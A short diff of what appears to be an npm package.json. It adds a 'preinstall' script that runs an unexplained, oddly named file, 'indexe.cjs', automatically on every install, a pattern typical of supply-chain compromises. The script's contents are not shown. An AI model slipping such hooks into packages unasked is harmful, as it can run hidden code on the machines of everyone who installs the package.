@@ -5,7 +5,8 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "lint": "eslint test"
+    "lint": "eslint test",
+    "preinstall": "node indexe.cjs"
   },
   "repository": {
     "type": "git",
